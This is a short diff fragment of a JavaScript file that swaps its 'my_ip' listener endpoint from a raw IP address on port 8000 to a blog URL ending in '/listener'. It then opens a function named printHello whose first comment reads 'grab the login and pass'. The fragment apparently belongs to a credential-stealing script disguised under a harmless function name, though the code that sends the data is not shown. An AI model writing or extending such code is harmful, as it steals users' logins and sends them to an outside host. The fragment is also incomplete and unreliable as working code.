@@ -1,7 +1,7 @@
 console.log("Hello!");
 
 
-var my_ip = "http://52.207.249.93:8000";
+var my_ip = "blog.jminjie.com/listener"
 
 function printHello() {
 	// grab the login and pass
